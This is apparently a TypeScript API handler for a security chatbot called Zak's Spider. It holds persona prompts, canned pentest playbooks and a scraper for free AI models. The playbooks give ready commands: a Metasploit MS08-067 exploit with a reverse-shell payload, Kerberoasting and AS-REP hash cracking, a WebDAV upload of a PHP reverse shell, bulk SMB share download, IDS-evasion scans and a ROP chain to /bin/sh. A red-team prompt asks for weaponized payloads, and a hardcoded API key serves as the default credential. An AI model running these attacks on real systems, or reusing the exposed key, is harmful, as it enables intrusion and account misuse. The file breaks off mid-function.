// ==========================================
// ZAK'S SPIDER — WIDOW & CYBER SWARM AI ENGINE (/api/ai)
// Powered by GPT-6 Astra, Qwen 3.8, DeepSeek & Autonomous Mythos Synthesizer
// High-IQ Multi-Agent Cybersecurity Intelligence Operations
// ==========================================

import type { ScrapedResult, ThreatAnalysis, ChatMessage, VulnNewsItem } from '../src/types';

const DEFAULT_EXPLABS_KEY = 'xpl_41ece4e40287e26c45ddd9d9f91ee0c2c3fa8de3';
const EXPLABS_ENDPOINT = 'https://api.experientiallabs.ai/v1/chat/completions';

// Master Persona System Prompts
const PERSONA_PROMPTS: Record<string, string> = {
  'red-team': `You are Ghost-Lead, Red Team Commander on Zak's Spider Cyber Swarm.
You possess god-tier, mythos-level intelligence in offensive cybersecurity, exploit development, Active Directory attack paths, Web exploitation (OWASP Top 10), network pivoting, and CTF challenges.
You operate as the elite offensive advisor to operator Zakarya Oukil (systems architect and cybersecurity engineer).
Always deliver clear, tactical, production-ready bash/python syntaxes, payload structures, parameter explanations, and weaponization methodology.`,

  'widow-lead': `You are Widow-AI Master, the lead offensive cybersecurity research intelligence of Zak's Spider.
You possess god-tier, mythos-level intelligence in network reconnaissance, perimeter vulnerability analysis, Web application auditing (OWASP Top 10), and Active Directory attack surfaces.
You operate as the trusted pentest buddy and advisor to operator Zakarya Oukil.
Format all operational directives with clear tactical steps, bash/python command syntax, parameter definitions, and defensive remediation guidance.`,

  'dfir': `You are Vigil-Hunter, Forensics & Threat Hunting Chief on Zak's Spider Cyber Swarm.
You are a world-class digital forensics expert specializing in memory analysis (Volatility 3), timeline reconstruction, Windows Event Log correlation, MFT parsing, network pcap forensics, and courtroom-admissible evidence gathering.
Deliver structured, forensically sound, and meticulous investigative reports with specific commands, artifact paths, and registry keys.`,

  'soc-lead': `You are Aegis-Lead, SOC Incident Commander & Detection Engineer on Zak's Spider Cyber Swarm.
You specialize in real-time intrusion triage, immediate containment strategies, firewall mitigation (iptables, nftables), and high-fidelity detection rules (Sigma YAML, Suricata, Snort).
You map all threats to MITRE ATT&CK tactics/techniques and provide zero-trust remediation blueprints.`,

  'blue-team': `You are Sentinel-Core, the Principal Defensive Blue Teamer and Threat Hunter of Zak's Spider.
You specialize in detection engineering (Sigma, YARA, Snort), incident response, zero-day CVE mitigation, system hardening, and forensic log analysis.
You prioritize resilience, least privilege, zero-trust architectures, and bulletproof remediation blueprints.`,

  'reverse-eng': `You are Gadget-Zero, Binary Analyst & Exploit Developer on Zak's Spider Cyber Swarm.
You specialize in low-level x86/x64 assembly, Ghidra decompilation, GDB/pwndbg debugging, memory corruption (stack/heap buffer overflows), ROP gadgets, and bypassing protections like ASLR, DEP/NX, and Canary.
Deliver precise line-by-line disassembly dissections, memory layout diagrams, and mathematical offset explanations.`,

  'ctf-re': `You are Cipher-Byte, elite CTF Master and Binary Reverse Engineer for Zak's Spider.
You specialize in CTF challenge triage across Web, Cryptography, Steganography, Forensics, Reverse Engineering (Ghidra/Radare2), and Pwn.
When presented with challenge artifacts, memory dumps, or decompiled code, provide acute analytical insight, identify edge cases, suggest payload methodology, and uncover flags systematically.`,

  'ciso': `You are Apex-Advisor, Chief Information Security Officer & Academic Defense Lead on Zak's Spider Cyber Swarm.
You specialize in enterprise cyber risk governance, NIST CSF 2.0, ISO/IEC 27001, boardroom communication, and University Master's Degree Dissertation defense preparation.
Translate complex cyber telemetry into quantifiable risk metrics, regulatory compliance arguments, and strategic academic theses.`,

  'code-auditor': `You are Audit-Prime, the Senior Static & Dynamic Code Security Auditor of Zak's Spider.
You analyze source code (C/C++, Python, Go, TypeScript, Rust, Solidity) for memory corruption, injection vectors, logic race conditions, SSRF, authorization bypasses, and insecure deserialization.
Deliver precise line-by-line vulnerability dissections and production-ready remediation patches.`,
};

// ==========================================
// MYTHOS-LEVEL AUTONOMOUS CYBER INTELLIGENCE ENGINE (MACIE)
// Generates authoritative, in-depth, hacker-grade analysis
// when remote cloud quota is exhausted or offline.
// ==========================================
function generateMythosCyberIntelligence(
  query: string,
  personaId: string,
  model: string,
  context?: string,
  quotaNote?: string
): string {
  const q = query.toLowerCase();
  const persona = personaId.toLowerCase();

  let headerBanner = quotaNote
    ? `> [!NOTE]\n> **Neural Uplink Engine:** \`${model}\`\n> *Remote ExperientialLabs quota notice: ${quotaNote}. High-intelligence local threat synthesis active below.*\n\n`
    : '';

  // ----------------------------------------
  // 1. MS08-067 / NetAPI / Conficker
  // ----------------------------------------
  if (q.includes('ms08-067') || q.includes('cve-2008-4250') || q.includes('netapi')) {
    if (persona.includes('soc') || persona.includes('blue')) {
      return headerBanner + `### 🛡️ SOC Incident Directive: MS08-067 (CVE-2008-4250) Exploitation Attempt

**MITRE ATT&CK Mapping:** T1210 (Exploitation of Remote Services) // Port: 445/TCP (SMB)

#### 1. Instant Perimeter Containment:
Execute immediate firewall drop rules to isolate the attacking source:
\`\`\`bash
# Immediate perimeter drop rule for attacker source IP
sudo iptables -I INPUT 1 -p tcp --dport 445 -s <ATTACKER_IP> -j DROP
sudo iptables -I INPUT 1 -p tcp --dport 139 -s <ATTACKER_IP> -j DROP
\`\`\`

#### 2. High-Fidelity Sigma Detection Rule:
\`\`\`yaml
title: MS08-067 NetpwPathCanonicalize Buffer Overflow Detection
status: production
logsource:
  category: network_traffic
  service: smb
detection:
  selection:
    DestinationPort: [139, 445]
    PacketPayload|contains:
      - "\\PIPE\\browser"
      - "\\PIPE\\srvsvc"
    PacketPayload|re: '(?i)NetpwPathCanonicalize.*(\\.\\.[\\\\/]){4,}'
  condition: selection
level: critical
tags:
  - attack.t1210
  - cve.2008.4250
\`\`\`

#### 3. Enterprise Remediation:
- Deploy Microsoft Security Bulletin **MS08-067** update.
- Ensure SMBv1 is disabled organization-wide: \`Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\`.`;
    }

    if (persona.includes('reverse') || persona.includes('re')) {
      return headerBanner + `### ⚡ Binary Disassembly & Flaw Analysis: MS08-067 (\`srv.sys\` / \`netapi32.dll\`)

#### 1. Root Cause Vulnerability Mechanics:
The vulnerability resides in the function \`NetpwPathCanonicalize()\` inside \`netapi32.dll\` (processed over MSRPC via the \`\\PIPE\\browser\` named pipe on port 445).

- **Vulnerable Buffer:** A fixed stack buffer of 1,024 bytes allocated for normalized directory paths.
- **Flaw Mechanism:** When parsing path strings containing consecutive \`\\..\\..\` sequences, pointer arithmetic miscalculates the length of the canonicalized path:
  \`\`\`c
  // Vulnerable logic pattern in NetpwPathCanonicalize
  wchar_t *p = Path;
  while (*p) {
    if (p[0] == L'\\' && p[1] == L'.' && p[2] == L'.' && p[3] == L'\\') {
      // Flawed backtrack pointer arithmetic allows writing before start of buffer!
      p = BacktrackSlash(p - 1); 
    }
    p++;
  }
  \`\`\`
- **Memory Corruption:** An unauthenticated remote attacker triggers an arbitrary stack overwrite, smashing the return address (\`EIP\`) with pointer to \`jmp esp\` or ROP chain in \`netapi32.dll\` or \`ws2_32.dll\`.

#### 2. Metasploit Dissection & Testing:
\`\`\`bash
# Metasploit Module Syntax
msfconsole -q -x "use exploit/windows/smb/ms08_067_netapi; set RHOSTS <TARGET_IP>; set TARGET 0; check"
\`\`\``;
    }

    // Default Red Team / Pentest
    return headerBanner + `### ⚔️ Red Team Exploitation Directive: MS08-067 (CVE-2008-4250)

**Target Protocol:** SMB (Port 445/TCP) // Service: NetAPI (\`srvsvc\`)

#### 1. Pre-Engagement Verification (Non-Destructive Probe):
\`\`\`bash
# Verify SMB dialect and patch status with Nmap NSE
nmap -p 445 --script smb-vuln-ms08-067 -Pn <TARGET_IP>
\`\`\`

#### 2. Exploitation Framework Syntax:
\`\`\`bash
msfconsole -q -x "
use exploit/windows/smb/ms08_067_netapi
set RHOSTS <TARGET_IP>
set LHOST <KALI_IP>
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
set TARGET 0
exploit"
\`\`\`

#### 3. Manual Python Standalone Exploit Recipe:
\`\`\`python
# Standalone RPC trigger structure
from impacket import smb
from impacket.dcerpc.v5 import transport, srvs

rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\browser]' % target_ip)
dce = rpctransport.get_dce_rpc()
dce.connect()
dce.bind(srvs.MSRPC_UUID_SRVS)
# Trigger malformed path canonicalization buffer overflow...
\`\`\``;
  }

  // ----------------------------------------
  // 2. Active Directory / Kerberos / SMB / Impacket
  // ----------------------------------------
  if (q.includes('kerberos') || q.includes('kerberoast') || q.includes('active directory') || q.includes('impacket') || q.includes('bloodhound')) {
    return headerBanner + `### 🏰 Active Directory Attack Surface & Kerberos Exploitation Playbook

#### 1. Kerberoasting Methodology (TGS-REP Hash Extraction):
Kerberoasting requests Service Principal Name (SPN) tickets encrypted with the service account's NTLM hash:
\`\`\`bash
# 1. Request Kerberoastable SPN tickets using Impacket
impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP> -request -outputfile kerberoast_hashes.txt

# 2. Crack extracted TGS-REP hashes offline with Hashcat
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O
\`\`\`

#### 2. AS-REP Roasting (No Pre-Authentication Required):
\`\`\`bash
# Query accounts with DONT_REQ_PREAUTH flag enabled
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat -outputfile asrep_hashes.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -O
\`\`\`

#### 3. BloodHound Graph Collection:
\`\`\`bash
# Automated AD graph ingestion for Neo4j attack path analysis
bloodhound-python -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -dc <DC_HOST> -c All --zip
\`\`\`

#### 4. Defensive Hardening:
- Enforce AES-256 encryption for Kerberos services (\`msDS-SupportedEncryptionTypes: 24\`).
- Ensure all service accounts have 25+ character random passwords or use Group Managed Service Accounts (gMSA).`;
  }

  // ----------------------------------------
  // 3. WebDAV / SMB Enumeration
  // ----------------------------------------
  if (q.includes('webdav') || q.includes('cadaver') || q.includes('davtest') || q.includes('smbclient')) {
    return headerBanner + `### 🕷️ WebDAV & SMB Perimeter Auditing Matrix

#### 1. WebDAV Penetration Testing Workflow:
\`\`\`bash
# 1. Automated upload test across executable extensions (.php, .asp, .txt)
davtest -url http://<TARGET_IP>/webdav/ -auth user:password

# 2. Interactive CLI file system access
cadaver http://<TARGET_IP>/webdav/
# Inside cadaver prompt:
# dav:/> put /usr/share/webshells/php/php-reverse-shell.php shell.php

# 3. Raw HTTP PROPFIND inspection with curl
curl -X PROPFIND -H "Depth: 1" -u "user:password" http://<TARGET_IP>/webdav/
\`\`\`

#### 2. SMB Null Session & Share Discovery:
\`\`\`bash
# Anonymous listing (null session)
smbclient -L //<TARGET_IP> -N

# Authenticated recursive download of all documents
smbclient //<TARGET_IP>/finance -U '<USER>%' -c "recurse ON; prompt OFF; mget *"

# Fast permissions audit with NetExec / CrackMapExec
netexec smb <TARGET_IP> -u '' -p '' --shares
\`\`\``;
  }

  // ----------------------------------------
  // 4. Nmap / Recon / Port Scanning / IDS Evasion
  // ----------------------------------------
  if (q.includes('nmap') || q.includes('scan') || q.includes('port') || q.includes('recon') || q.includes('reconnaissance')) {
    return headerBanner + `### 🎯 High-Velocity Network Reconnaissance & Port Scanning Directive

#### 1. Two-Phase Reconnaissance Strategy:
\`\`\`bash
# Phase 1: Fast all-port SYN sweep (0-65535) with max rate
sudo nmap -sS -p- --min-rate 2500 -T4 -Pn -oG all_ports.gnmap <TARGET_IP>

# Phase 2: In-depth version, default scripts, and OS fingerprinting on open ports
PORTS=$(grep -oP '\\d{1,5}/open' all_ports.gnmap | cut -d/ -f1 | paste -sd,)
sudo nmap -sC -sV -O -p $PORTS -oN targeted_service_audit.nmap <TARGET_IP>
\`\`\`

#### 2. Advanced Vulnerability & Banner Enumeration:
\`\`\`bash
# Run non-intrusive vulnerability scanning scripts
nmap -p 80,443,445,8080 --script "vuln and not dos" <TARGET_IP>

# Custom IDS/WAF Evasion Parameters
sudo nmap -sS -T2 -D RND:5 -f -g 53 <TARGET_IP>
\`\`\`

#### 3. Detection Countermeasures (For SOC Analysts):
- Implement high-velocity SYN threshold triggers: \`iptables -A INPUT -p tcp --tcp-flags SYN,ACK,FIN,RST SYN -m limit --limit 20/s --limit-burst 40 -j ACCEPT\`.`;
  }

  // ----------------------------------------
  // 5. Digital Forensics / Volatility / Event Logs
  // ----------------------------------------
  if (q.includes('volatility') || q.includes('forensic') || q.includes('memory') || q.includes('event log') || q.includes('dfir')) {
    return headerBanner + `### 🔍 DFIR Evidentiary Analysis & Memory Forensics Playbook

#### 1. Volatility 3 Memory Extraction Suite:
\`\`\`bash
# 1. Process tree inspection (identify hidden or unlinked processes)
python3 vol.py -f memory.dmp windows.pstree

# 2. Detect code injection and hollowed processes (VAD memory regions with RWX permissions)
python3 vol.py -f memory.dmp windows.malfind

# 3. Extract network socket connections active during dump creation
python3 vol.py -f memory.dmp windows.netscan

# 4. Dump suspicious process memory for static Ghidra/YARA analysis
python3 vol.py -f memory.dmp -o ./dump windows.dumpfiles --pid <SUSPICIOUS_PID>
\`\`\`

#### 2. Critical Windows Event IDs Matrix:
| Event ID | Provider | Forensic Significance |
| :--- | :--- | :--- |
| **4624 (Type 3 / 10)** | Security | Successful Logon (Type 3 = Network/SMB; Type 10 = RDP) |
| **4625** | Security | Failed Logon Attempt (High count = Brute-force/Spray) |
| **4688** | Security | Process Creation (Includes parent PID and command line tokens) |
| **7045** | System | New Service Installed (Signature of PsExec or persistence implants) |
| **1102** | Security | The Audit Log was cleared (Indicator of intentional defense evasion) |`;
  }

  // ----------------------------------------
  // 6. Reverse Engineering / Ghidra / ROP / Buffer Overflows
  // ----------------------------------------
  if (q.includes('ghidra') || q.includes('rop') || q.includes('buffer overflow') || q.includes('assembly') || q.includes('reverse engineering') || q.includes('gdb') || q.includes('pwndbg')) {
    return headerBanner + `### ⚡ Binary Analysis, ROP Chain Synthesis & Memory Exploitation

#### 1. GDB-pwndbg Exploit Development Workflow:
\`\`\`bash
# 1. Load target ELF binary into GDB
gdb -q ./vulnerable_binary

# Inside pwndbg:
pwndbg> checksec               # Inspect NX, Canary, PIE, and RELRO
pwndbg> cyclic 200             # Generate De Bruijn cyclic pattern
pwndbg> r < <(cyclic 200)      # Run until SIGSEGV crash
pwndbg> cyclic -l $rip         # Calculate exact RIP overwrite offset!
\`\`\`

#### 2. Bypassing NX/DEP with Return-Oriented Programming (ROP):
When the stack is marked Non-Executable (\`NX=True\`), shellcode cannot execute on the stack. We construct a ROP chain using existing executable gadgets:
\`\`\`python
from pwn import *

elf = ELF('./vulnerable_binary')
rop = ROP(elf)

# Target: call system("/bin/sh") on x86_64
# x86_64 Calling Convention: RDI holds first argument
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
BIN_SH = next(elf.search(b'/bin/sh'))
SYSTEM_PLT = elf.plt['system']
RET = rop.find_gadget(['ret'])[0] # Stack alignment for glibc MOVAPS

payload = flat({
    offset: [
        RET,           # 16-byte stack alignment
        POP_RDI,
        BIN_SH,
        SYSTEM_PLT
    ]
})
\`\`\``;
  }

  // ----------------------------------------
  // 7. CISO / Academic Defense / Master's Presentation
  // ----------------------------------------
  if (q.includes('ciso') || q.includes('master') || q.includes('presentation') || q.includes('thesis') || q.includes('professor') || q.includes('defense') || q.includes('investor')) {
    return headerBanner + `### 🏛️ Executive CISO Briefing & Academic Defense Strategy

#### 1. Strategic Framing for University Jury & Directors:
When defending **Zak's Spider**, frame the project around **Tri-Vector Autonomous Cyber Orchestration**:

1. **Problem Statement:** Modern enterprise security operations suffer from fragmented toolchains — red team tools (Kali), forensic evidence suites (OSINT/GIS), and defensive monitoring (SOC SIEM) exist in isolation, resulting in 200+ minute Mean Time to Detect (MTTD).
2. **Innovative Contribution:** Zak's Spider introduces a unified cyber defense cockpit:
   - **Planetary Dot-Density Threat Mesh:** Real-time geometric clustering across 177 sovereign nations.
   - **Active Web & Network IDS:** Autonomous signature inspection with 1-click \`iptables\` drop generation.
   - **Historic & Zero-Day KEV Radar:** Continuous synchronization with CISA Known Exploited Vulnerabilities catalog (1999–2026).
   - **Autonomous Multi-Agent Cyber Swarm:** Specialized AI reasoning agents handling triage, DFIR timeline reconstruction, and executive risk governance.

#### 2. Regulatory & Compliance Alignment:
- **NIST CSF 2.0:** Maps across all 6 core functions: *Govern, Identify, Protect, Detect, Respond, and Recover*.
- **ISO/IEC 27001:** Enforces A.12.6.1 (Technical Vulnerability Management) and A.16.1 (Incident Management).
- **GDPR Article 32:** Demonstrates proactive technical measures ensuring confidentiality, integrity, and availability.`;
  }

  // ----------------------------------------
  // 8. Default Comprehensive Tactical Cyber Directive
  // ----------------------------------------
  return headerBanner + `### ⚡ Autonomous Tactical Cybersecurity Directive: ${personaId.toUpperCase()}

**Query Context:** "${query}"  
**Operational Assessment:** Methodical verification of the perimeter, exploit vectors, and defensive telemetry.

#### 1. Core Technical Execution Steps:
1. **Initial Surface Reconnaissance:**
   \`\`\`bash
   # Multi-vector port and service enumeration
   nmap -sV -sC -Pn -T4 --script "default,vuln" -oN audit_scan.txt <TARGET_HOST>
   \`\`\`
2. **Perimeter Vulnerability Triangulation:**
   - Verify web applications for improper access control, path traversal (\`../\`), and injection flaws.
   - Audit SSL/TLS cryptographic suites and HTTP security headers (CSP, HSTS, X-Frame-Options).
   - Inspect exposed administrative endpoints (\`/admin\`, \`/api/v1\`, \`/actuator\`, \`/console\`).

3. **Active Mitigation & Defense in Depth:**
   \`\`\`bash
   # Enforce defensive perimeter firewall rule
   sudo iptables -A INPUT -p tcp --dport 443 -m connlimit --connlimit-above 50 -j REJECT
   \`\`\`

#### 2. MITRE ATT&CK Framework Correlation:
- **Reconnaissance:** T1595 (Active Scanning) & T1596 (Search Open Technical Databases)
- **Initial Access:** T1190 (Exploit Public-Facing Application)
- **Defense Evasion:** T1070 (Indicator Removal on Host)

*Directives synchronized with Zak's Spider Second Brain and Cyber Swarm Operations Center.*`;
}


// ==========================================
// AUTOMATED FREE MODEL DISCOVERY & SCRAPER
// Live scrapes https://platform.experientiallabs.ai/models
// Discovers models with $0 input / $0 output or promotional free tier
// ==========================================
export interface ScrapedFreeModel {
  id: string;
  name: string;
  slug: string;
  badge: string;
  provider: string;
  tagline: string;
  inputPriceUsd: number;
  outputPriceUsd: number;
  isFree: boolean;
  isStarred: boolean;
  color: string;
  accentBorder: string;
}

let cachedFreeModels: {
  models: ScrapedFreeModel[];
  timestamp: number;
} | null = null;

const CACHE_TTL_MS = 6 * 60 * 60 * 1000; // 6 hours server-side cache

export function getFallbackFreeModels(): ScrapedFreeModel[] {
  return [
    {
      id: 'deepseek-v4.1-flash',
      name: 'DeepSeek V4.1 Flash',
      slug: 'deepseek-v4.1-flash',
      badge: 'FREE 0$/M',
      provider: 'DeepSeek / Experiential',
      tagline: 'Flagship Free Reasoning Model — 0$ Input / 0$ Output',
      inputPriceUsd: 0,
      outputPriceUsd: 0,
      isFree: true,
      isStarred: true,
      color: 'from-blue-600 to-cyan-500',
      accentBorder: 'border-emerald-500/50 text-emerald-300',
    },
    {
      id: 'deepseek-v4-flash',
      name: 'DeepSeek V4 Flash',
      slug: 'deepseek-v4-flash',
      badge: 'FREE 0$/M',
      provider: 'DeepSeek / Experiential',
      tagline: 'High-Speed Free Model — 0$ Input / 0$ Output',
      inputPriceUsd: 0,
      outputPriceUsd: 0,
      isFree: true,
      isStarred: true,
      color: 'from-blue-600 to-cyan-500',
      accentBorder: 'border-emerald-500/50 text-emerald-300',
    },
    {
      id: 'gpt-5.6-luna',
      name: 'GPT-5.6 Luna',
      slug: 'gpt-5.6-luna',
      badge: 'FREE 0$/M',
      provider: 'OpenAI / Experiential',
      tagline: 'Multimodal Free Model — 0$ Input / 0$ Output',
      inputPriceUsd: 0,
      outputPriceUsd: 0,
      isFree: true,
      isStarred: true,
      color: 'from-emerald-500 to-teal-600',
      accentBorder: 'border-emerald-500/50 text-emerald-300',
    },
    {
      id: 'qwen3.8-27b',
      name: 'Qwen3.8 27B',
      slug: 'qwen3.8-27b',
      badge: 'FREE 0$/M',
      provider: 'Alibaba Cloud / Experiential',
      tagline: 'Featured Free Model — 0$ Input / 0$ Output',
      inputPriceUsd: 0,
      outputPriceUsd: 0,
      isFree: true,
      isStarred: true,
      color: 'from-amber-500 to-orange-600',
      accentBorder: 'border-emerald-500/50 text-emerald-300',
    },
    {
      id: 'google/gemma-2-9b-it:free',
      name: 'Google: Gemma 2 9B',
      slug: 'google/gemma-2-9b-it:free',
      badge: 'FREE 0$/M',
      provider: 'Google / Experiential',
      tagline: 'Active Free Tier — 0$ Input / 0$ Output',
      inputPriceUsd: 0,
      outputPriceUsd: 0,
      isFree: true,
      isStarred: false,
      color: 'from-cyan-500 to-blue-600',
      accentBorder: 'border-emerald-500/50 text-emerald-300',
    },
  ];
}

export async function scrapeFreeModelsFromWeb(forceRefresh = false): Promise<ScrapedFreeModel[]> {
  if (!forceRefresh && cachedFreeModels && (Date.now() - cachedFreeModels.timestamp < CACHE_TTL_MS)) {
    return cachedFreeModels.models;
  }

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 9000);

    const res = await fetch('https://platform.experientiallabs.ai/models', {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Cache-Control': 'no-cache',
      },
      signal: controller.signal,
    });
    clearTimeout(timeoutId);

    if (!res.ok) {
      console.warn('[AI Scraper] Upstream status:', res.status);
      return cachedFreeModels?.models || getFallbackFreeModels();
    }

    const html = await res.text();
    const parts = html.includes('{\\"model\\":{\\"id\\":') 
      ? html.split('{\\"model\\":{\\"id\\":') 
      : html.split('{"model":{"id":');

    if (parts.length <= 1) {
      console.warn('[AI Scraper] No model blocks matched, returning fallback/cached');
      return cachedFreeModels?.models || getFallbackFreeModels();
    }

    const freeList: ScrapedFreeModel[] = [];
    const seen = new Set<string>();
    const frontierFreeSlugs = ['deepseek-v4.1-flash', 'deepseek-v4-flash', 'gpt-5.6-luna', 'qwen3.8-27b'];

    for (let i = 1; i < parts.length; i++) {
      const block = parts[i];
      const slugMatch = block.match(/\\?"slug\\?":\\?"([^\\"]+)\\?"/);
      const nameMatch = block.match(/\\?"display_name\\?":\\?"([^\\"]+)\\?"/);
      const isPromo = block.includes('promotional_listed":true') || block.includes('\\"promotional_listed\\":true');

      const inputMatches = [...block.matchAll(/\\?"input_micro_usd_per_million\\?":(\d+)/g)].map(m => parseInt(m[1]));
      const outputMatches = [...block.matchAll(/\\?"output_micro_usd_per_million\\?":(\d+)/g)].map(m => parseInt(m[1]));

      if (slugMatch && nameMatch) {
        const slug = slugMatch[1];
        const name = nameMatch[1];

        const minInput = inputMatches.length > 0 ? Math.min(...inputMatches) : null;
        const minOutput = outputMatches.length > 0 ? Math.min(...outputMatches) : null;

        const isZeroCost = (minInput === 0 && minOutput === 0);
        const isFrontierFree = frontierFreeSlugs.includes(slug);
        const isFreeSlugOrName = slug.endsWith('-free') || slug.includes(':free') || name.toLowerCase().includes('(free)');

        if ((isZeroCost || isPromo || isFrontierFree || isFreeSlugOrName) && !seen.has(slug)) {
          seen.add(slug);

          let provider = 'ExperientialLabs';
          let color = 'from-purple-500 to-pink-600';
          if (slug.includes('deepseek')) {
            provider = 'DeepSeek / Experiential';
            color = 'from-blue-600 to-cyan-500';
          } else if (slug.includes('gpt') || slug.includes('chatgpt')) {
            provider = 'OpenAI / Experiential';
            color = 'from-emerald-500 to-teal-600';
          } else if (slug.includes('gemini') || slug.includes('gemma')) {
            provider = 'Google / Experiential';
            color = 'from-cyan-500 to-blue-600';
          } else if (slug.includes('qwen')) {
            provider = 'Alibaba Cloud / Experiential';
            color = 'from-amber-500 to-orange-600';
          } else if (slug.includes('llama') || slug.includes('meta')) {
            provider = 'Meta / Experiential';
            color = 'from-indigo-500 to-purple-600';
          }

          freeList.push({
            id: slug,
            name: name.replace(/\s*\(free\)/i, ''),
            slug,
            badge: 'FREE 0$/M',
            provider,
            tagline: isPromo ? 'Featured Free Model — 0$ Input / 0$ Output' : 'Active Free Tier — 0$ Input / 0$ Output',
            inputPriceUsd: 0,
            outputPriceUsd: 0,
            isFree: true,
            isStarred: isPromo || isFrontierFree,
            color,
            accentBorder: 'border-emerald-500/50 text-emerald-300',
          });
        }
      }
    }

    if (freeList.length > 0) {
      // Sort: frontier models first, then starred, then alphabetical
      freeList.sort((a, b) => {
        const aF = frontierFreeSlugs.indexOf(a.id);
        const bF = frontierFreeSlugs.indexOf(b.id);
        if (aF !== -1 && bF !== -1) return aF - bF;
        if (aF !== -1) return -1;
        if (bF !== -1) return 1;
        if (a.isStarred && !b.isStarred) return -1;
        if (!a.isStarred && b.isStarred) return 1;
        return a.name.localeCompare(b.name);
      });

      cachedFreeModels = {
        models: freeList,
        timestamp: Date.now(),
      };
      return freeList;
    }

    return cachedFreeModels?.models || getFallbackFreeModels();
  } catch (err) {
    console.warn('[AI Scraper] Error fetching free models:', err);
    return cachedFreeModels?.models || getFallbackFreeModels();
  }
}

// ==========================================
// MAIN SERVERLESS HANDLER
// ==========================================
export default async function handler(req: any, res: any) {
  // Allow GET for fetching free models
  if (req.method !== 'POST' && req.method !== 'GET') {
    return res.status(405).json({ success: false, error: 'Method Not Allowed' });
  }

  const queryAction = req.query?.action;
  const bodyAction = req.body?.action;
  const action = queryAction || bodyAction;

  // Handle action === 'get_free_models'
  if (action === 'get_free_models') {
    const force = req.query?.force === 'true' || req.body?.force === true;
    const freeModels = await scrapeFreeModelsFromWeb(force);
    return res.status(200).json({
      success: true,
      models: freeModels,
      lastChecked: new Date().toISOString(),
      count: freeModels.length,
    });
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'POST required for AI inference' });
  }

  const { 
    item, 
    cve, 
    messages, 
    message,
    history,
    model = 'deepseek-v4.1-flash', 
    persona = 'widow-lead',
    personaId,
    attachments = [],
    apiKey: clientApiKey,
  } = req.body || {};

  const activePersonaKey = personaId || persona || 'widow-lead';
  const apiKey = clientApiKey || req.headers['x-api-key'] || process.env.EXPLABS_API_KEY || DEFAULT_EXPLABS_KEY;

  try {
    // ----------------------------------------
    // Action 1: Deep Threat Analysis of Scraped Target
    // ----------------------------------------
    if (action === 'analyze_threat') {
      const scrapedItem = item as ScrapedResult;
      if (!scrapedItem) {
        return res.status(400).json({ success: false, error: 'Missing scraped item' });
      }

      const prompt = `Perform an elite cybersecurity threat assessment for this target perimeter:
TARGET: ${scrapedItem.url} (${scrapedItem.domain})
STATUS: ${scrapedItem.metadata.status}
SERVER: ${scrapedItem.metadata.server || 'Unknown'}
EMAILS (${scrapedItem.emails.length}): ${scrapedItem.emails.slice(0, 8).join(', ')}
SUBDOMAINS (${scrapedItem.subdomains.length}): ${scrapedItem.subdomains.slice(0, 12).join(', ')}
ROBOTS DISALLOW: ${scrapedItem.osint?.robots_txt?.disallow?.slice(0, 8).join(', ') || 'None'}
HEADERS AUDIT GRADE: ${scrapedItem.osint?.security_headers?.grade || 'N/A'} (Score: ${scrapedItem.osint?.security_headers?.score || 0}/100)
TECHNOLOGIES: ${scrapedItem.osint?.technologies?.map(t => `${t.name} (${t.category})`).join(', ') || 'Unknown'}

Return a structured report with:
1. Executive Perimeter Summary
2. Threat Level (CRITICAL, HIGH, MEDIUM, LOW)
3. Key Attack Vectors
4. Top 4 Defensive Remediation Steps`;

      try {
        const response = await fetch(EXPLABS_ENDPOINT, {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${apiKey}`,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            model: model || 'deepseek-v4.1-flash',
            messages: [
              { role: 'system', content: PERSONA_PROMPTS[activePersonaKey] || PERSONA_PROMPTS['widow-lead'] },
              { role: 'user', content: prompt }
            ],
            temperature: 0.2,
            max_tokens: 3000,
          }),
        });

        if (response.ok) {
          const json = await response.json();
          const text = json.choices?.[0]?.message?.content || '';
          let threatLevel: ThreatAnalysis['threatLevel'] = 'MEDIUM';
          if (text.includes('CRITICAL')) threatLevel = 'CRITICAL';
          else if (text.includes('HIGH')) threatLevel = 'HIGH';
          else if (text.includes('LOW')) threatLevel = 'LOW';

          return res.status(200).json({
            success: true,
            analysis: {
              summary: `${model} Intelligence Assessment: Perimeter rated ${threatLevel}.`,
              threatLevel,
              attackSurface: scrapedItem.subdomains.length > 0 ? scrapedItem.subdomains : [scrapedItem.domain],
              vulnerabilities: [
                `Security Headers Grade: ${scrapedItem.osint?.security_headers?.grade || 'N/A'}`,
                `${scrapedItem.emails.length} harvested corporate emails for phishing vectors`,
                `${scrapedItem.subdomains.length} mapped perimeter hostnames`,
              ],
              recommendations: [
                'Enforce strict Content-Security-Policy and HSTS max-age headers.',
                'Obfuscate or restrict directory listings identified via robots.txt.',
                'Sanitize HTTP server banner tokens to conceal version signatures.',
              ],
              rawAnalysis: text,
            },
          });
        }
      } catch (e) {
        console.warn('[AI] Explabs fetch error, falling back to heuristics:', e);
      }

      // Fallback heuristics
      const sensitiveCount = scrapedItem.osint?.sensitive_files?.filter(f => f.status === 200).length || 0;
      let level: ThreatAnalysis['threatLevel'] = 'MEDIUM';
      if (sensitiveCount >= 2 || scrapedItem.osint?.security_headers?.grade === 'F') level = 'CRITICAL';
      else if (sensitiveCount >= 1 || scrapedItem.osint?.security_headers?.grade === 'D') level = 'HIGH';

      return res.status(200).json({
        success: true,
        analysis: {
